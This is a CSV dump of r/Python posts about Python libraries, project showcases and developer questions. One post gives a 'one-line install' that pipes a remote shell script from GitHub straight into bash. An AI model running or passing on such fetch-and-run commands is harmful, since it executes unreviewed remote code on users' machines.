1mrxbxc,Why are all the task libraries and frameworks I see so heavy?,thegreattriscuit,168,55,2025-08-16 14:47:12,https://www.reddit.com/r/Python/comments/1mrxbxc/why_are_all_the_task_libraries_and_frameworks_i/,"From what I can see all the libraries around task queuing (celery, huey, dramatiq, rq) are built around this idea of decorating a callable and then just calling it from the controller.  Workers are then able to pick it up and execute it.  

This all depends on the workers and controller having the same source code though.   So your controller is dragging around dependencies that will only ever be needed by the workers, the workers are dragging around dependencies what will only ever be needed by the controller, etc.   

Are there really no options between this heavyweight magical RPC business and ""build your own task tracking from scratch""?  

I want all the robust semantics of retries, circuit breakers, dead-letter, auditing, stuff like that.  I just don't want the deep coupling all these seem to imply.  

Or am I missing some reason the coupling can be avoided, etc? "
1mrvawd,Minimal Python Environment Variable Validator ‚Äì Built Without AI,devlittle,3,1,2025-08-16 13:29:23,https://www.reddit.com/r/Python/comments/1mrvawd/minimal_python_environment_variable_validator/,"Hey, everyone!

I created a small Python library called **Venvalid** to validate environment variables in a simple and minimalist way.

**What My Project Does:**  
Venvalid helps you define and validate environment variables easily in Python projects. It ensures that your application configuration is correct and reduces runtime errors caused by missing or invalid environment values.

**Target Audience:**  
This library is meant for developers who want a lightweight and easy-to-use solution for environment variable validation. It's not intended to compete with large-scale configuration frameworks‚Äîit's more of a ‚Äúfun project‚Äù and a personal exercise in building something from scratch.

**Comparison:**  
There are many existing libraries that handle environment variable validation (e.g., `envalid from Node.JS`), but Venvalid focuses on minimalism and simplicity. It‚Äôs designed for those who want a small dependency-free tool and enjoy reading straightforward Python code.

I would love your feedback and opinions! Feel free to check it out:  
[https://github.com/PinnLabs/Venvalid](https://github.com/PinnLabs/Venvalid)"
1mrutnf,"Knowing a little C, goes a long way in Python",jcfitzpatrick12,259,33,2025-08-16 13:09:43,https://www.reddit.com/r/Python/comments/1mrutnf/knowing_a_little_c_goes_a_long_way_in_python/,"I've been branching out and learning some C while working on the latest release for [Spectre](https://github.com/jcfitzpatrick12/spectre). Specifically, I was migrating from a Python implementation of the short-time fast Fourier transform from Scipy, to a custom implementation using the [FFTW C library](https://www.fftw.org/) (via the excellent [pyfftw](https://github.com/pyFFTW/pyFFTW)).

What I thought was quite cool was that doing the implementation first in C went a long way when writing the same in Python. In each case,

* You fill up a buffer in memory with the values you want to transform.
* You tell FFTW to execute the DFT in-place on the buffer.
* You copy the DFT out of the buffer, into the spectrogram.

Understanding what the memory model looked like in C, meant it could basically be lift-and-shifted into Python. For the curious (and critical, do have mercy - it's new to me), the core loop in C looks like (see [here on GitHub](https://github.com/jcfitzpatrick12/spectre-lite/blob/main/src/stfft.c#L264-L291)):

    for (size_t n = 0; n < num_spectrums; n++)
        {
            // Fill up the buffer, centering the window for the current frame.
            for (size_t m = 0; m < window_size; m++)
            {
                signal_index = m - window_midpoint + hop * n;
                if (signal_index >= 0 && signal_index < (int)signal->num_samples)
                {
                    buffer->samples[m][0] =
                        signal->samples[signal_index][0] * window->samples[m][0];
                    buffer->samples[m][1] =
                        signal->samples[signal_index][1] * window->samples[m][1];
                }
                else
                {
                    buffer->samples[m][0] = 0.0;
                    buffer->samples[m][1] = 0.0;
                }
            }
    
            // Compute the DFT in-place, to produce the spectrum.
            fftw_execute(p);
    
            // Copy the spectrum out the buffer into the spectrogram.
            memcpy(s.samples + n * window_size,
                   buffer->samples,
                   sizeof(fftw_complex) * window_size);
        }

The same loop in Python looks strikingly similar (see [here on GitHub](https://github.com/jcfitzpatrick12/spectre-core/blob/main/src/spectre_core/post_processing/_stfft.py#L173-L195)):

       for n in range(num_spectrums):
            # Center the window for the current frame
            center = window_hop * n
            start = center - window_size // 2
            stop = start + window_size
    
            # The window is fully inside the signal.
            if start >= 0 and stop <= signal_size:
                buffer[:] = signal[start:stop] * window
    
            # The window partially overlaps with the signal.
            else:
                # Zero the buffer and apply the window only to valid signal samples
                signal_indices = np.arange(start, stop)
                valid_mask = (signal_indices >= 0) & (signal_indices < signal_size)
                buffer[:] = 0.0
                buffer[valid_mask] = signal[signal_indices[valid_mask]] * window[valid_mask]
    
            # Compute the DFT in-place, to produce the spectrum.
            fftw_obj.execute()
    
            // Copy the spectrum out the buffer into the spectrogram.
            dynamic_spectra[:, n] = np.abs(buffer)"
1mruhax,"pytex - looking for reviews, comments, PRs and/or any criticism",Phovox,6,15,2025-08-16 12:55:26,https://www.reddit.com/r/Python/comments/1mruhax/pytex_looking_for_reviews_comments_prs_andor_any/,"Hi there folks! 

I've been using a python script called \`pytex\` for several years written in Python 2 and it really helped me a lot. In the end, however, with the advent of Python 3 and because my needs evolved I created my own version. 

\`pytex\` automates the creation of pdf files from .tex files. It is similar to \`rubber\` (with the exception that it supports index entries) and also \`latexmk\` (with the exception that it parses the output to show only a structured view of the relevant information). 

It is availabe in [https://github.com/clinaresl/pytex](https://github.com/clinaresl/pytex) and I'm open to any comments, ideas or suggestions to improve it, or to make it more accessible to others. "
1mru089,HAL 9000 local voice-controlled AI assistant,Lonely_Delivery_1945,15,0,2025-08-16 12:35:11,https://www.reddit.com/r/Python/comments/1mru089/hal_9000_local_voicecontrolled_ai_assistant/,"Hi everyone,

I wanted to share a project I've been working on: a voice-operated conversational AI with the personality of HAL 9000 from 2001: A Space Odyssey. It's all built in Python and runs 100% locally.

# What My Project Does

* **Voice Control:** Uses voice input from your microphone to converse with the AI
* **Local LLM:** Uses local models with Ollama for entirely offline LLM inference/responses
* **HAL Personality:** Features a custom StyleTTS2 voice model fine-tuned with voice data from 2001: A Space Odyssey.
* **MCP Tooling Support:** Supports Weather and Time MCP tools

# Target Audience

This project is mainly for everyone (especially Space Odyssey fans) who want to play with a unique voice-controlled AI assistant. It's also for enthusiasts who are interested in local AI, real-time speech transcription, and real-time voice synthesis.

# Comparison

* Many other AI voice assistants use generic voices, but the HAL 9000 voice used in this project was fine-tuned for over 30 hours on each line of dialogue from HAL 9000 in 2001: A Space Odyssey.
* While most other AI voice assistants rely solely on the LLM's built-in knowledge base, this project supports MCP servers like weather, time, and web search
*  Some other LLM assistants rely on cloud APIs, but HAL 9000 can run entirely offline

# Try It

**Check out the Github repo:** [**https://github.com/tizerk/hal9000**](https://github.com/tizerk/hal9000)

It's been a great learning experience working on HAL, and I'm hoping to add a lot more to it.

Feedback is highly appreciated.  The code definitely isn't the cleanest or most optimized, and I would love to hear some solutions. 

Let me know what you think!"
1mrsylb,Python readline completer and command line parser,codimoc,2,0,2025-08-16 11:47:46,https://www.reddit.com/r/Python/comments/1mrsylb/python_readline_completer_and_command_line_parser/,"# Description

`pyrl-complete` is a Python library for building powerful, context-aware command-line auto-completion. It allows developers to define the grammar of a command-line interface (CLI) using a simple, human-readable syntax.

The library parses this grammar to understand all possible command structures, including commands, sub-commands, options, and arguments. It then uses this understanding to provide intelligent auto-completion suggestions and predictions as a user types.

`pyrl-complete` is based on [ply](https://github.com/dabeaz/ply),  a python lexer/parser by David Beazley, to interpret the the bespoke CLI grammar and to generate a tree of paths for all possible completions, and a simple state machine to navigate the tree and generate predictions.

You can fine a detailed description and possible use cases for CLI developers in [my page](https://github.com/codimoc/pyrl-complete), and download it from [pypi](https://pypi.org/project/pyrl-complete/).

When installed from pypi, you can run the following script from the python virtual environment where the package was installed to have a GUI to play with custom rules and auto completion:

`pyrl_rule_tester`

And you can use the following sample grammar to try some auto completions and predictions

`command [-h| ( get | set) (one | two | three) [-f ?]]; help [(get | set)];`

# Target Audience

This library can easily integrate into command line python projects, and hence it is targeted to CLI developers mainly."
1mrq1m9,"I built ‚ÄúPanamaram‚Äù ‚Äî an Offline, Open-Source Personal Finance Tracker in Python",MrShortCircuitMan,40,15,2025-08-16 09:15:26,https://www.reddit.com/r/Python/comments/1mrq1m9/i_built_panamaram_an_offline_opensource_personal/,"## What My Project Does
**Panamaram** is a secure, offline personal finance tracker built in Python.  
It helps you:
- Track expenses & income with categories, notes, and timestamps  
- Set bill and payment reminders (one-time or recurring)  
- View visual charts of spending patterns and budget progress  
- Export reports in PDF, XLSX, or CSV  
- Keep your data private with AES-256 database encryption and encrypted backups  
- Run entirely offline ‚Äî no cloud, no ads, no trackers  

## Target Audience
- Individuals who want **full control over their financial data** without relying on cloud services  
- Privacy-conscious users looking for **offline-first personal finance tools**  
- Python developers and hobbyists interested in **PySide6, pyAesCrypt, encryption, and cross-platform packaging**  
- Anyone needing a **production-ready personal finance app** that can also be a learning resource  

## Comparison
Most existing personal finance tools:
- Require online accounts or sync to the cloud  
- Contain ads or trackers  
- Don‚Äôt offer strong encryption for local data  

**Panamaram** is different because:
- Works 100% offline ‚Äî no data leaves your device  
- Uses **pyAesCryptr + AES-256 encryption** for maximum privacy  
- Is **open-source** and free to modify or extend  
- Cross-platform and easy to install via pip or packaged executables  

---

### Tech Stack & Details
- **Language:** Python 3.13  
- **UI:** PySide6 (Qt for Python)  
- **Database:** SQLite with optional SQLCipher  
- **Encryption:** pyAesCrypt (file-level) + cryptography.fernet (field-level)  
- **PDF Reports:** fpdf2 
- **Packaging:** pip for Windows/Linux/macOS & PyInstaller for Windows

---

### Install via pip
```bash
pip install panamaram
panamaram
```
GitHub: https://github.com/manikandancode/Panamaram

I‚Äôm completely new to this and I‚Äôm still improving it ‚Äî so I‚Äôd love to hear feedback, ideas, or suggestions.
If you like the project, a ‚≠ê on GitHub would mean a lot!"
1mrp11o,I built a CLI video editor with Python to make FFmpeg user-friendly. Meet `peg_this`!,godofredddit,23,7,2025-08-16 08:18:05,https://www.reddit.com/r/Python/comments/1mrp11o/i_built_a_cli_video_editor_with_python_to_make/,"
Hey everyone,

**TL;DR:** I made a Python CLI tool that puts a friendly, interactive menu on top of FFmpeg for common tasks like converting, cropping, trimming, and joining videos. You can grab it on [GitHub here](https://github.com/hariharen9/ffmpeg-this) or do a `pip install peg-this`.

## What My Project Does

`peg_this` is a simple tool that guides you through the process of video editing with interactive menus. Some of the features I'm most proud of:

- **Convert & Transcode**: Convert videos and audio to a wide range of popular formats (MP4, MKV, WebM, MP3, FLAC, WAV, GIF) with simple quality presets.
- **Join Videos (Concatenate)**: Combine two or more videos into a single file. The tool automatically handles differences in resolution and audio sample rates for a seamless join.
- **Trim (Cut) Videos**: Easily cut a video to a specific start and end time without re-encoding for fast, lossless clips.
- **Inspect Media Properties**: View detailed information about video and audio streams, including codecs, resolution, frame rate, bitrates, and more.
- **Visually Crop Videos**: An interactive tool that shows you a frame of the video, allowing you to click and drag to select the exact area you want to crop.
- **Extract Audio**: Rip the audio track from any video file into MP3, FLAC, or WAV.
- **Remove Audio**: Create a silent version of your video by stripping out all audio streams.
- **Batch Conversion**: Convert all media files in the current directory to a specified format in one go.

It's built with Python, using `ffmpeg-python`, `Rich` for the nice UI, and `Questionary` for the prompts.

## Target Audience

This tool is for you if you love FFmpeg's power but can never remember the exact syntax for complex filters, or if you hate opening a huge GUI editor just to trim a 10-second clip.

## Comparison to Existing Alternatives

While there are many powerful GUI video editors, `peg_this` offers a lightweight, fast, and scriptable alternative for common video tasks. Unlike using `ffmpeg` directly, `peg_this` provides an interactive and user-friendly experience.

The project is open-source and I'd love to get your feedback, feature ideas, or bug reports. Let me know what you think!

**Link:** [https://github.com/hariharen9/ffmpeg-this](https://github.com/hariharen9/ffmpeg-this)
**Profile** [https://github.com/hariharen9](https://github.com/hariharen9)

Hope you find it useful!"
1mrhuue,Built a PyQt5 decision tree app with whimsical guides in 75 minutes using Claude - here's the code,Infamous_Help_7524,0,8,2025-08-16 02:15:18,https://www.reddit.com/r/Python/comments/1mrhuue/built_a_pyqt5_decision_tree_app_with_whimsical/,"**I built a troubleshooting guide creator in 1.5 hours (including a burger break) with AI assistance**

Hey¬†[r/Python](https://www.reddit.com/r/Python/)!

I wanted to share something wild that happened today after work. My friend Allen needed a tool to create troubleshooting guides, so I decided to build him one. With Claude's help, I created a fully functional PyQt5 application in about 75 minutes of actual work time.

¬†¬†**What my project does:**

¬† \- Creates interactive decision tree troubleshooting guides

¬† \- Organizes guides by product and problem category

¬† \- Includes 8 example guides (eg a Quantum Coffee Maker where coffee exists in multiple temperature states simultaneously)

¬† \- Dark theme with cyan accents

¬† \- Full test suite, documentation, and GitHub Actions CI/CD

Comparison:  (to normal development)

¬†¬†**The crazy part:**

¬† \- Active development: \~45 minutes + 15 minutes requirements gathering

¬† \- Burger break: 30 minutes (left mid-development, AI held all context)

¬† \- Packaging for open source: 30 minutes

¬† \- Total: Under 2 hours from idea to published GitHub repo

¬†¬†**Tech stack:**

¬† \- Python + PyQt5 for the GUI

¬† \- MVC architecture

¬† \- JSON-based storage format (.tsg files)

¬† \- 14 tests including edge cases

¬†¬†**What I learned:**

The bottleneck in development isn't coding anymore‚Äîit's knowing what I wanted to build. The AI handled all the boilerplate, PyQt5 stuff, CSS styling, test writing, and fun lorem ipsum content. I mostly just had to direct it.

¬†This would've taken me 2-3 weeks in my free time solo.

¬†¬†**The code is open source (MIT license):**

¬† \- GitHub:¬†[https://github.com/vylasaven/treebleshooter](https://github.com/vylasaven/treebleshooter)

¬† \- One-line install: curl -sSL¬†[https://raw.githubusercontent.com/vylasaven/treebleshooter/main/run\_treebleshooter.sh](https://raw.githubusercontent.com/vylasaven/treebleshooter/main/run_treebleshooter.sh)¬†| bash

¬†¬†Target Audience\*\*:\*\*

\- Folks who will spread it around as a nice beginner python project with Claude, and assist their friends with learning to code with Claude

\- My friend Allen

¬† \- Contributors who want to add funny (or serious! actually useful ones would be nice) troubleshooting guide

¬† \-Contributors to porting / scaling / extending

The documentation includes a beginner developer guide and a ""prompting style guide"" showing how I worked with the AI.

¬†¬†**Unedited realtime video:**¬†[https://youtu.be/RFzutwPwmYo](https://youtu.be/RFzutwPwmYo)"
1mretmg,Saturday Daily Thread: Resource Request and Sharing! Daily Thread,AutoModerator,2,0,2025-08-16 00:00:32,https://www.reddit.com/r/Python/comments/1mretmg/saturday_daily_thread_resource_request_and/,"# Weekly Thread: Resource Request and Sharing üìö

Stumbled upon a useful Python resource? Or are you looking for a guide on a specific topic? Welcome to the Resource Request and Sharing thread!

## How it Works:

1. **Request**: Can't find a resource on a particular topic? Ask here!
2. **Share**: Found something useful? Share it with the community.
3. **Review**: Give or get opinions on Python resources you've used.

## Guidelines:

* Please include the type of resource (e.g., book, video, article) and the topic.
* Always be respectful when reviewing someone else's shared resource.

## Example Shares:

1. **Book**: [""Fluent Python""](https://www.amazon.com/Fluent-Python-Concise-Effective-Programming/dp/1491946008) \- Great for understanding Pythonic idioms.
2. **Video**: [Python Data Structures](https://www.youtube.com/watch?v=pkYVOmU3MgA) \- Excellent overview of Python's built-in data structures.
3. **Article**: [Understanding Python Decorators](https://realpython.com/primer-on-python-decorators/) \- A deep dive into decorators.

## Example Requests:

1. **Looking for**: Video tutorials on web scraping with Python.
2. **Need**: Book recommendations for Python machine learning.

Share the knowledge, enrich the community. Happy learning! üåü"
1mr9cub,Anyone finished the book Introduction to Computation and Programming using Python?,PsychologicalTip3823,0,9,2025-08-15 20:28:29,https://www.reddit.com/r/Python/comments/1mr9cub/anyone_finished_the_book_introduction_to/,"I am at chapter 8, classes and object oriented programming. After this chapter, the thing gone wild! It is all about computation and heavy computer science stuff. I'm an economics graduate.

  
I would like to ask whether here there is a computer science student (or groups) who would take me under their wings. We can discuss on discord everyweek about each chapter. 

Would that be okay?"
1mr74ad,"I built harvest-code ‚Äì package your codebase for LLMs, RAG, massive-context search & visualization",Revolutionary-Roll40,0,1,2025-08-15 19:04:53,https://www.reddit.com/r/Python/comments/1mr74ad/i_built_harvestcode_package_your_codebase_for/,"Hey folks, I just published harvest-code, a Python tool I built to make it dead simple to turn entire local or remote/Git codebases into a portable, searchable format ‚Äî perfect for feeding into LLMs with huge context windows or plugging into RAG pipelines.

https://pypi.org/project/harvest-code/

What it does:
	‚Ä¢	Harvests any codebase into structured JSON chunks
	‚Ä¢	Portable format you can feed directly to LLMs or RAG systems
	‚Ä¢	Built-in interactive web UI with search, filtering, and syntax highlighting
	‚Ä¢	Filter by file type, keywords, or patterns
	‚Ä¢	Works fully offline ‚Äî no cloud dependency

Why I built it:
I needed an easy way to package large projects so I could give LLMs structured access to all the relevant code ‚Äî without manually curating files. It‚Äôs been great for:
	‚Ä¢	Preprocessing datasets for LLM fine-tuning
	‚Ä¢	Powering RAG code assistants
	‚Ä¢	Exploring unknown codebases fast
	‚Ä¢	Teaching or auditing code

Install & run:

pip install harvest-code
harvest-code /path/to/codebase

Would love feedback from anyone working with big-context models or code RAG setups. What features would make this even more useful?"
1mr3xef,What do you expect from a Python build backend in 2025?,Different-Winter5245,0,10,2025-08-15 17:09:33,https://www.reddit.com/r/Python/comments/1mr3xef/what_do_you_expect_from_a_python_build_backend_in/,"I'm currently working on a PEP 517/518/778-compliant build backend with support for:

* secure and portable symbolic links,
* platform-specific installation directories (data, config, cache),
* building standalone self-contained binaries (e.g., via PyInstaller),
* fine-grained control over file inclusion for wheels, sdists, and binaries.

Before pushing the design further, I'd like to gather input from the community.

**Questions:**

* What do you currently need from a Python build backend?
* What are the limitations or pain points in existing solutions?
* Are there any specific or unusual use cases you feel are poorly supported?
* How do you handle non-Python files (e.g., assets, data, symlinks, binaries, etc) in your builds?
* Do you rely on workarounds or custom tooling to fill gaps?

I'd appreciate any feedback or experience you can share. Whether you're building libraries, CLI tools, or shipping full applications, your input would be valuable."
1mr1vlw,üåä PySurf v1.2.0 ‚Äì Lightweight Python Browser,Apart-Television4396,41,35,2025-08-15 15:55:31,https://www.reddit.com/r/Python/comments/1mr1vlw/pysurf_v120_lightweight_python_browser/,"Hey everyone!

I‚Äôm excited to share PySurf v1.2.0, the latest update to my minimalist web browser built with Python and PyQt5. If you haven‚Äôt heard of PySurf before, it‚Äôs a lightweight, clean, and open source browser designed for speed and simplicity, made in Python using PyQt5.

What‚Äôs New in v1.2.0:

* Downloads Support ‚Äì Save files directly from the browser
* Full Screen Mode ‚Äì Enjoy distraction-free browsing
* Find on Page ‚Äì Quickly search for text on any webpage
* Custom App Icon ‚Äì PySurf now has its own icon for a more polished look
* Cleaner layout and more polished tab & homepage design
* Improved button interactions across homepage and tabs
* Full changelog [here](https://github.com/VG-dev1/PySurf/releases/tag/v1.2.0)

You can check it out or install it [here](http://github.com/VG-dev1/PySurf).

I‚Äôd love to hear your thoughts, feedback, or feature requests! PySurf is all about keeping browsing simple but powerful, and your input helps make it better.

TL;DR: PySurf v1.2.0 adds downloads, full screen, find-on-page, UI improvements, and a new app icon‚Äîall while keeping the lightweight, distraction-free experience you love."
1mqzamk,Could Python ever get something like C++‚Äôs constexpr?,uname_IsAlreadyTaken,57,53,2025-08-15 14:22:47,https://www.reddit.com/r/Python/comments/1mqzamk/could_python_ever_get_something_like_cs_constexpr/,"I really fell in love with constexpr in c++.

I know Python doesn‚Äôt have anything like C++‚Äôs `constexpr` today, but I‚Äôve been wondering if it‚Äôs even possible (or desirable) for the language to get something similar.

In C++, you can mark a function as `constexpr` so the compiler evaluates it at compile time:

    constexpr int square(int x) {
        if (x < 0) throw ""negative value not allowed"";
        return x * x;
    }
    
    constexpr int result = square(5);  // OK
    constexpr int bad    = square(-2); // compiler/ide error here

The second call never even runs ‚Äî the compiler flags it right away.

Imagine if Python had something similar:

    @constexpr
    def square(x: int) -> int:
        if x < 0:
            raise ValueError(""negative value not allowed"")
        return x * x
    
    result = square(5)    # fine
    bad    = square(-2)   # IDE/tooling flags this immediately

**Even if it couldn‚Äôt be** ***true*** **compile-time like C++, having the IDE run certain functions during static analysis and flag invalid constant arguments could be a huge dev experience boost.**

Has anyone seen PEPs or experiments around this idea?"
1mqwbpq,A bit of a hot take: Is raw Python skill becoming a commodity because of AI?,Repulsive-Rip-7750,0,9,2025-08-15 12:25:44,https://www.reddit.com/r/Python/comments/1mqwbpq/a_bit_of_a_hot_take_is_raw_python_skill_becoming/,"hey all,

so i've been wrestling with this thought for a while, especially after spending way too much time with copilot and the latest GPT models.

They're getting scary good. Like, you can ask for a reasonably complex script to parse a weird CSV, hit an API, and dump it into a database, and it just... writes it. 90% of the way there in seconds.

It got me thinking, if an AI can write the code, what's the actual valuable skill we're supposed to have? For the last decade, the advice has been ""cram python, get a job,"" but it feels like the goalposts are moving. The raw ability to write python syntax feels less important than it used to be.

My day job is slowly turning into just gluing different APIs together. The most valuable thing I did last week wasn't writing a clever algorithm, it was figuring out how to get an AI model's output formatted correctly to feed into another service, all running on a serverless function. The actual python part was the glue, not the main event.

I guess my core point is that the value is shifting from being a ""Python Developer"" to being a ""Systems Architect"" who just happens to use Python. The money seems to be in knowing how to orchestrate AI tools, not in crafting perfect list comprehensions anymore.

I couldn't shake this idea, so I spent a night writing it all down on my blog to see if it made sense. Genuinely curious to hear what you all think. Am I just paranoid or is anyone else feeling this shift?

Here's the full post if you want to read the whole rant: [https://www.ghibly.com/2025/08/why-your-python-skills-are-becoming.html](https://www.ghibly.com/2025/08/why-your-python-skills-are-becoming.html)

Let me know why I'm wrong. Cheers"
1mqw7zr,A simple home server to wirelessly stream any video file (or remote URL) to devices in my LA,Enzo10091,56,55,2025-08-15 12:21:17,https://www.reddit.com/r/Python/comments/1mqw7zr/a_simple_home_server_to_wirelessly_stream_any/,"I was tired of dealing with HDMI cables, ""format not supported"" errors, and cables just to watch videos from my PC on other devices.

So I wrote a lightweight Python server to fix it: FFmpeg-HTTP-Streamer.



GitHub Repo: [https://github.com/vincenzoarico/FFmpeg-HTTP-Streamer](https://github.com/vincenzoarico/FFmpeg-HTTP-Streamer)



What it does:

\- Streams any local video file (.mkv, .mp4, etc.) on-the-fly. You don't need to convert anything.

\- Can also stream a remote URL (you can extract an internet video URL with the 1DM Android/iOS app). Just give it a direct link to a video.



How you actually watch stuff: just take the .m3u link provided by the server and load it into any player app (IINA, VLC, M3U IPTV app for TV).



On your phone: VLC for Android/iOS.

On your Smart TV (even non-Android ones like Samsung/LG): Go to your TV's app store, search for an ""IPTV Player"" or ""M3U IPTV,"" and just add the link.



It's open-source, super easy to set up, and I'd love to hear what you think. Check it out and give it a star on GitHub if you find it useful.



Ask me anything!"
1mquu2n,[request] Looking for a word aligner between a text and its translated version in python.,KiradaLeBg,0,6,2025-08-15 11:16:56,https://www.reddit.com/r/Python/comments/1mquu2n/request_looking_for_a_word_aligner_between_a_text/,I have tried different aligner such as awesome align and simalign but they are really inaccurate (I got around 30-40% of accury with those two tools) and I can't find other in python. I had some apis such as microsft translate api but they are really expensive too. Is there anyone who made a word aligner by any chance ?
1mqu6ae,Open for review and suggestions,Adam_yahya,1,1,2025-08-15 10:44:05,https://www.reddit.com/r/Python/comments/1mqu6ae/open_for_review_and_suggestions/,"Hi everyone, I just finished building a dual honeypot project for educational purposes. It includes both an SSH honeypot that logs login attempts and simulates a fake shell with basic commands, and a WordPress HTTP login honeypot that captures login attempts and shows a fake admin dashboard. I‚Äôm looking for feedback on the structure, code quality, and security practices, as well as any suggestions for improvements or additional features.

 LINK : [https://github.com/adamyahya/honeypot-project](https://github.com/adamyahya/honeypot-project)"
1mqtc5z,"I built a small CLI tool to clean up project junk (like pycache, *.pyc, .pytest_cache)",DasKaroWow,17,21,2025-08-15 09:59:54,https://www.reddit.com/r/Python/comments/1mqtc5z/i_built_a_small_cli_tool_to_clean_up_project_junk/,"Hey everyone!

I built a little CLI cleaner that helps clean up temporary and junk files in your project instead of making clean.py or clean.sh for every project.

It supports:

* dry-run and actual deletion (--delete)
* filters by dirs, files, globs
* ignores like .git, .venv, etc.
* very simple interface via typer

[Source](https://github.com/DasKaroWow/cli_cleaner)
[Demo](https://imgur.com/a/tX0ONlg)

I'd love feedback ‚Äî on features, naming, UX, anything! This started as a tool for myself, but maybe others will find it useful too"
1mqr6u7,"A Playbook for Writing AI-Ready, Type-Safe Python Tests (using Pytest, Ruff, Mypy)",Journerist,0,2,2025-08-15 07:57:17,https://www.reddit.com/r/Python/comments/1mqr6u7/a_playbook_for_writing_aiready_typesafe_python/,"Hi everyone,

Like many of you, I've been using AI coding assistants and have seen the productivity boost firsthand. But I also got curious about the impact on code quality. The latest data is pretty staggering: one 2025 study found AI-assisted projects have an **8x increase in code duplication** and a **40% drop in refactoring**.

This inspired me to create a practical playbook for writing Python tests that act as a ""safety net"" against this new wave of technical debt. This isn't just theory; it's an actionable strategy using a modern toolchain.

Here are a couple of the core principles:

# Principle 1: Test the Contract, Not the Implementation

The biggest mistake is writing tests that are tightly coupled to the internal structure of your code. This makes them brittle and resistant to refactoring.

**A brittle test looks like this (it breaks on any refactor):**

    # This test breaks if we rename or inline the helper function.
    def test_process_data_calls_helper_function(monkeypatch):
        mock_helper = MagicMock()
        monkeypatch.setattr(module, ""helper_func"", mock_helper)
        
        process_data({})
        
        mock_helper.assert_called_once()

**A resilient test focuses only on the observable behavior:**

    # This test survives refactoring because it focuses on the contract.
    def test_processing_empty_dict_returns_default_result():
        input_data = {}
        expected_output = {""status"": ""default""}
        
        result = process_data(input_data)
        
        assert result == expected_output

# Principle 2: Enforce Reality with Static Contracts (Protocols)

AI tools often miss the subtle contracts between components. Relying on duck typing is a recipe for runtime errors. `typing.Protocol` is your best friend here.

**Without a contract, this is a ticking time bomb:**

    # A change in one component breaks the other silently until runtime.
    class StripeClient:
        def charge(self, amount_cents: int): ... # Takes cents
    
    class PaymentService:
        def checkout(self, total: float):
            self.client.charge(total) # Whoops! Sending a float, expecting an int.

**With a** `Protocol`, your type checker becomes an automated contract enforcer:

    # The type checker will immediately flag a mismatch here.
    class PaymentGateway(Protocol):
        def charge(self, amount: float) -> str: ...
    
    class StripeClient: # Mypy/Pyright will validate this against the protocol.
        def charge(self, amount: float) -> str: ...

# The Modern Quality Stack to Enforce This:

* **Test Runner:** **Pytest** \- Its fixture system is perfect for Dependency Injection.
* **Linter/Formatter:** **Ruff** \- An incredibly fast, all-in-one tool that replaces Flake8, isort, Black, etc. It's your first line of defense.
* **Type Checkers:** **Mypy** or **Pyright** \- Non-negotiable for validating Protocols and catching type errors before they become bugs.

I've gone into much more detail on these topics, with more examples on fakes vs. mocks, `autospec`, and dependency injection in a full blog post.

**You can read the full deep-dive here:** [https://www.sebastiansigl.com/blog/type-safe-python-tests-in-the-age-of-ai](https://www.sebastiansigl.com/blog/type-safe-python-tests-in-the-age-of-ai)

I'd love to hear your thoughts. What quality challenges have you and your teams been facing in the age of AI?"
1mqnd7u,MicroPie version 0.20 released (ultra micro asgi framework),Miserable_Ear3789,18,4,2025-08-15 04:23:40,https://www.reddit.com/r/Python/comments/1mqnd7u/micropie_version_020_released_ultra_micro_asgi/,"Hey everyone tonite I released the latest version of [MicroPie](https://patx.github.io/micropie), my ultra micro ASGI framework inspired by CherryPy's method based routing.

This release focused on improving the frameworks ability to handle large file uploads. We introduced the new `_parse_multipart_into_request` for live request population, added bounded asyncio.Queues for file parts to enforce backpressure, and updated `_asgi_app_http` to start parsing in background.

With these improvements we can now handle large file uploads, successfully tested with a 20GB video file.

You can check out and star the project on Github: [patx/micropie](https://github.com/patx/micropie). We are still in active development. MicroPie provides an easy way to learn more about ASGI and modern Python web devlopment. If you have any questions or issues please file a issue report on the Github page.

The file uploads are performant. They benchmark better then FastAPI which uses Startlet to handle multipart uploads. Other frameworks like Quart and Sanic are not able to handle uploads of this size at this time (unless I'm doing something wrong!). Check out the benchmarks for a 14.4 GB .mkv file. The first is MicroPie, the second is FastAPI:
```
$ time curl -X POST -F ""file=@video.mkv"" http://127.0.0.1:8000/upload
Uploaded video.mkv
real	0m41.273s
user	0m0.675s
sys	0m12.197s
$ time curl -X POST -F ""file=@video.mkv"" http://127.0.0.1:8000/upload
{""status"":""ok"",""filename"":""video.mkv""}
real	1m50.060s
user	0m0.908s
sys	0m15.743s
```

The code used for FastAPI:
```
import os
import aiofiles
from fastapi import FastAPI, UploadFile, File
from fastapi.responses import HTMLResponse

os.makedirs(""uploads"", exist_ok=True)
app = FastAPI()

@app.get(""/"", response_class=HTMLResponse)
async def index():
    return """"""<form action=""/upload"" method=""post"" enctype=""multipart/form-data"">
        <input type=""file"" name=""file"" required>
        <input type=""submit"" value=""Upload"">
    </form>""""""

@app.post(""/upload"")
async def upload(file: UploadFile = File(...)):
    filepath = os.path.join(""uploads"", file.filename)
    async with aiofiles.open(filepath, ""wb"") as f:
        while chunk := await file.read():
            await f.write(chunk)
    return {""status"": ""ok"", ""filename"": file.filename}
```

And the code used for MicroPie:
```
import os
import aiofiles
from micropie import App

os.makedirs(""uploads"", exist_ok=True)

class Root(App):
    async def index(self):
        return """"""
            <form action=""/upload"" method=""post"" enctype=""multipart/form-data"">
            <input type=""file"" name=""file"" required>
            <input type=""submit"" value=""Upload"">
            </form>""""""

    async def upload(self, file):
        filepath = os.path.join(""uploads"", file[""filename""])
        async with aiofiles.open(filepath, ""wb"") as f:
            while chunk := await file[""content""].get():
                await f.write(chunk)
        return f""Uploaded {file['filename']}""

app = Root()
```"
1mqixg2,"Python CLI to run multiple AI models, what would you add to make it even more dev-friendly?",Severe-Wedding7305,0,0,2025-08-15 00:54:35,https://www.reddit.com/r/Python/comments/1mqixg2/python_cli_to_run_multiple_ai_models_what_would/,"Hey everyone, I shared this CLI before but wanted to get more feedback and ideas.

It‚Äôs called Tasklin, a Python CLI that lets you run prompts on OpenAI, Ollama, and more, all from one tool. Outputs come as structured JSON, so you can easily use them in scripts, automation, or pipelines.

I‚Äôd love to hear what you think, any improvements, or cool ways you‚Äôd use something like this in your projects!

GitHub: [https://github.com/jetroni/tasklin](https://github.com/jetroni/tasklin)  
PyPI: [https://pypi.org/project/tasklin](https://pypi.org/project/tasklin)"
